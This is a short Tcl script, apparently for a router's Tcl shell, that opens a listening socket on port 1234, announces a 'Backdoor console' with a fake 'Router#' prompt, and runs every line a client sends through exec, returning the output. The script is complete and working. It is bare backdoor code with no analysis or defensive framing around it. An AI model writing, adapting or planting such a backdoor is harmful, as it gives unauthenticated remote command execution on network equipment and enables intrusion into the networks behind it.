 proc callback {sock addr port} {
fconfigure $sock -translation crlf -buffering line
puts $sock "Backdoor console:"
puts $sock " "
puts -nonewline $sock "Router# "
flush $sock
fileevent $sock readable [list echo $sock]
}
proc echo {sock} {
global var
flush $sock
if {[catch {gets $sock line}] ||
[eof $sock]} {
return [close $sock]
}
catch {exec $line} result
if {[catch {puts $sock $result}]} {
return [close $sock]
}
puts -nonewline $sock "Router# "
flush $sock
}

set port 1234
set sh [socket -server callback $port]
vwait var
close $sh
